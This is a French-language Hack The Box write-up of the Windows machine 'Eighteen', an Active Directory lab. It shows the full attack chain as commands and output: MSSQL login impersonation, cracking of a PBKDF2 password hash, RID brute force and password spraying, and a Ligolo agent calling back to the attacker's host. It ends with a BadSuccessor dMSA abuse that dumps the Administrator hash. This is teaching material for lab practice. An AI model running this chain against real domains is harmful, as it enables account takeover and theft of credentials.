---
date: 2026-04-11T02:30:27-05:00
# description: ""
image: "/images/HTB-Eighteen/Eigtheen.png"
showTableOfContents: true
tags: ["HackTheBox", "Active Directory", "MSSQL", "PBKDF2", "Password Spraying", "RID Brute Force", "BadSuccessor", "CVE-2025-53779", "dMSA", "Delegation Abuse", "Kerberos Delegation"]
categories: ["Writeups"]
title: "HTB: Eighteen"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Eighteen](https://app.hackthebox.com/machines/Eighteen)
* Niveau: Facile
* OS: Windows
---

L'attaque commence par la découverte de privilèges d'usurpation d'identité dans MSSQL, permettant d'accéder au compte `appdev` et d'extraire un hachage PBKDF2-SHA256, qui est ensuite déchiffré pour récupérer un mot de passe. Une attaque par force brute sur le RID et une attaque de type `password spraying` permettent une connexion utilisateur valide via WinRM.

L'énumération du système identifie Windows Server 2025 et la vulnérabilité BadSuccessor. En exploitant les autorisations d'unité d'organisation (OU), un compte dMSA malveillant est créé et utilisé pour la délégation Kerberos, permettant finalement l'usurpation d'identité de l'administrateur et la compromission totale du domaine.

# Scanning

```
nmap -p- --open -T4 -sCV -oA nmap/Eighteen {TARGET_IP}
```

**Results**
```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-11 11:37 EDT
Nmap scan report for 10.129.26.3 (10.129.26.3)
Host is up (0.19s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eighteen.htb/

1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.26.3:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-04-11T14:36:10
|_Not valid after:  2056-04-11T14:36:10
|_ssl-date: 2026-04-11T14:43:29+00:00; -1h00m01s from scanner time.
| ms-sql-info: 
|   10.129.26.3:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1h00m01s, deviation: 0s, median: -1h00m02s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 367.77 seconds
```

Trois ports ouverts:

* 80 exécute un service HTTP avec `Microsoft IIS httpd 10.0`, avec une redirection vers eighteen.htb
* 1433 exécute `Microsoft SQL Server 2022`
* 5985 est le port par défaut pour `WinRM` (gestion à distance)

```
echo "{IP} eighteen.htb DC01.eighteen.htb" | sudo tee -a /etc/hosts
```


# Énumération

À l'adresse `http://eighteen.htb/`, on trouve une application web dédiée aux finances personnelles.

![Eighteen website](/images/HTB-Eighteen/eighteen_website.png)

Une fois inscrits et connectés, nous avons accès à un tableau de bord.

![Eighteen dashboard](/images/HTB-Eighteen/eighteen_dashboard.png)

Il existe également une page `Admin`, mais nous ne pouvons pas y accéder.

![Access denied](/images/HTB-Eighteen/access_denied.png)

## Énumération MSSQL

Les attaques par force brute sur les répertoires et l'énumération des sous-domaines s'avèrent infructueuses ; nous nous tournons donc vers MSSQL.

À l'aide des identifiants fournis, nous nous connectons à la base de données.

```
impacket-mssqlclient 'kevin:iNa2we6haRj2gaw!'@eighteen.htb
```

![mssql login](/images/HTB-Eighteen/eighteen_mssql.png)

Nous commençons par énumérer les bases de données.

```
enum_db
```

![database enumeration](/images/HTB-Eighteen/eighteen_enum-db.png)

La cible dispose d'une base de données personnalisée nommée `financial_planner`. Nous essayons d'y accéder, mais notre utilisateur n'y parvient pas.

```
USE financial_planner;
```

`ERROR(DC01): Line 1: The server principal "kevin" is not able to access the database "financial_planner" under the current security context.`

![db access denied](/images/HTB-Eighteen/db_access_denied.png)

Nous poursuivons l'énumération avec :
```
enum_impersonate
```

![db enum impersonate](/images/HTB-Eighteen/enum_impersonate.png)

L'utilisateur `kevin` a l'autorisation de se faire passer pour l'utilisateur `appdev`. Nous changeons de contexte à l'aide de la commande suivante:

```
EXECUTE AS LOGIN = 'appdev';
```

Nous pouvons désormais accéder à la base de données.

![MSSQL as appdev](/images/HTB-Eighteen/appdev_mssql.png)

Ci-dessous, la liste de tous les tables:
```
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
```

![tables listed](/images/HTB-Eighteen/eighteen_list_tables.png)

La table `users` semble être la plus intéressante.

```
SELECT * FROM users;
```

![admin hash](/images/HTB-Eighteen/admin_hash.png)

## Hachage PBKDF2 

Un hachage PBKDF2-SHA256 est récupéré.

```
pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
```

Ce format de hachage nous a été présenté dans [HTB: Compiled](https://scorpiosec.com/posts/htb-compiled/). Cette fois-ci, nous devons procéder à quelques ajustements, puisque hashcat attend le format suivant:  
```
<HASH_ALGORITHM>:<NUMBER_OF_ITERATIONS>:<base64_SALT>:<base64_hash>
```

Valeur du sel: `AMtzteQIG7yAbZIa`

Valeur de hachage: `0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133`

- Convertir le sel en Base64
```
QU10enRlUUlHN3lBYlpJYQ==
```

- Convertir la valeur de hachage en octets (nous avons besoin de la longueur de la clé dérivée en octets), puis en base64.
```
BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```

La longueur est de `32`.

Nous utilisons le script suivant pour le faire rapidement.
```python
import base64

h = "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"
raw = bytes.fromhex(h)
b64 = base64.b64encode(raw).decode()

print(raw)
print(b64)
print(len(raw))
```

![hash data](/images/HTB-Eighteen/hash_data.png)

Le hachage complet est:
```
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```


Le hachage est déchiffré à l'aide de hashcat et le mot de passe `iloveyou1` est récupéré.
```
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt -O
```

![password recovered](/images/HTB-Eighteen/pbkdf2_hash_cracked.png)

Nous nous connectons en tant que `admin` à l'application web; l'accès au tableau de bord d'administration est désormais possible.

![admin dashboard accessed](/images/HTB-Eighteen/admin_dashboard.png)

Même avec un accès administrateur, il ne semble pas y avoir de faille exploitable sur l'application web.

Au bas de la page, on apprend qu'il s'agit d'une application Flask, avec un serveur de base de données nommé `dc01`.

![system info](/images/HTB-Eighteen/system_info.png)

L'exécution de la commande `enum_links` dans MSSQL le confirme.

![MSSQL enum_links](/images/HTB-Eighteen/eighteen_enum_links.png)

# Accès initial

## Attaque par force brute sur RID
L'application web n'a révélé aucune faille exploitable; nous nous concentrons donc désormais sur le contrôleur de domaine.

Une attaque par force brute sur le RID peut être utilisée pour énumérer les noms d'utilisateur du domaine.

```
netexec mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
```

![RID brute force](/images/HTB-Eighteen/eghteen_RDI_bruteforce.png)

## Password Spray
Le mot de passe récupéré est valable pour l'un des utilisateurs du domaine

```
netexec winrm eighteen.htb -u usernames.txt -p 'iloveyou1' --no-bruteforce
```

![password spray](/images/HTB-Eighteen/winrm_pwd_spray.png)

Nous nous connectons avec:
```
evil-winrm -i eighteen.htb -u adam.scott -p 'iloveyou1'
```

![user flag](/images/HTB-Eighteen/eighteen_user.png)

# Élévation des privilèges

Outre le compte `Administrator`, il existe un autre compte: `mssqlsvc`.

> Les comptes de service tels que `mssqlsvc` ne se connectent pas en mode interactif et ne disposent généralement pas de profils dans le répertoire `C:\Users`.

![user accounts](/images/HTB-Eighteen/eighteen_users.png)

D'après la commande netexec précédente (attaque par force brute sur le RID), nous savons que nous avons affaire à Windows Server 2025. Bloodhound ne détecte aucune faille exploitable; nous recherchons donc les vulnérabilités de cette version.

En recherchant `Windows Server 2025 vulnerability` sur Google, we find [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory), une vulnérabilité permettant l'escalade de privilèges. L'article explique comment exploiter la fonctionnalité dMSA pour obtenir des privilèges supérieurs.

Cette faille peut être exploitée dans deux cas de figure :
- La délégation existe déjà --> nous l'exploitons directement.
- La délégation n'existe pas, mais nous la créons --> dans ce cas, nous avons besoin de droits d'écriture sur l'unité d'organisation (OU).

## Énumération OU
Le script PowerShell ci-dessous énumère toutes les unités d'organisation (OU), examine leurs listes de contrôle d'accès (ACL) et filtre les autorisations Active Directory pertinentes.

```powershell
Import-Module .\PowerView.ps1

# Get current user object
$currentUser = Get-DomainUser -Identity (whoami)

# Enumerate ACLs on all OUs
Get-DomainOU | ForEach-Object {
    $currentOU = $_

    Get-DomainObjectAcl -Identity $currentOU.DistinguishedName -ResolveGUIDs |
        Where-Object {
            $_.IdentityReference -eq $currentUser.SID -and
            ($_.ActiveDirectoryRights -match 'CreateChild|GenericAll|GenericWrite')
        } |
        Select-Object @{
            Name = 'OU'
            Expression = { $currentOU.Name }
        }, IdentityReference, ActiveDirectoryRights
}
```

![OUs enumeration](/images/HTB-Eighteen/OUs_enumeration.png)

`adam.scott` dispose des autorisations AD suivantes : `GenericalAll`, `CreateChild`, `WriteDacl`, `WriteOwner` et d'autres encore sur les unités d'organisation (OU) `Staff` et `Domain Controllers`.


## Abus de dMSA
Nous pouvons créer un objet dMSA et le contrôler entièrement.

**1. Importation du module (à télécharger [ici](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)).**

```
Import-Module .\BadSuccessor.ps1
```

**2. Création d'un dMSA malveillant pour usurper l'identité de `Administrator`.**
```
BadSuccessor -mode exploit -Path "OU=Staff,DC=eighteen,DC=htb" -Name "evil_dMSA" -DelegatedAdmin "adam.scott" -DelegateTarget "Administrator" -domain "eighteen.htb"
```

![malicious dMSA creation](/images/HTB-Eighteen/bad_dmsa.png)

**3. Configuration du tunnel**

Pour accéder au contrôleur de domaine depuis notre machine d'attaque, nous utilisons Ligolo pour établir un tunnel.

**Sur une machine d'attaque**

```
ligolo-proxy -selfcert -laddr 0.0.0.0:11601
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo
```

**Sur la machine cible**
```
# Use the upload feature in evil-winrm
upload agent.exe
.\agent.exe -connect <KALI_IP>:11601 -ignore-cert
```

**Dans LIGOLO**
```
session
1
start
```

![ligolo setup](/images/HTB-Eighteen/eighteen_ligolo_setup.png)

**4. Synchronisation du temps**
```
faketime "$(curl -sik http://eighteen.htb:5985/ | grep -i 'Date: ' | sed s/'Date: '//g)" bash
```

**5. `adam.scott` Demande de TGT Kerberos**
```
impacket-getTGT eighteen.htb/'adam.scott:iloveyou1' -dc-ip 240.0.0.1
```

![adam scott ticket](/images/HTB-Eighteen/adam_scott_ticket.png)


```
export KRB5CCNAME=adam.scott.ccache
```

**6. Demande de ticket de service Kerberos via S4U2Self pour se faire passer pour `evil_DMSA$`**
```
python3 getST.py eighteen.htb/adam.scott:iloveyou1 -impersonate 'evil_DMSA$' -dc-ip 240.0.0.1 -dmsa -self -k -no-pass
```
![dMSA ticket request](/images/HTB-Eighteen/dMSA_ticket_request.png)

```
export KRB5CCNAME="evil_DMSA\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache"
```
![dMSA ticket export ](/images/HTB-Eighteen/ticket_export2.png)

**7. Dump du hachage de l'administrateur**
```
impacket-secretsdump EIGHTEEN.HTB/evil_dMSA\$@dc01.eighteen.htb -k -no-pass -dc-ip 240.0.0.1 -target-ip 240.0.0.1 -just-dc-user Administrator
```
![eight secrets dump](/images/HTB-Eighteen/eight_secretsdump.png)

**8. Authentification en tant qu'administrateur**
```
evil-winrm -i dc01.eighteen.htb -u administrator -H {hash}
```
![eighteen root flag](/images/HTB-Eighteen/eighteen_root.png)
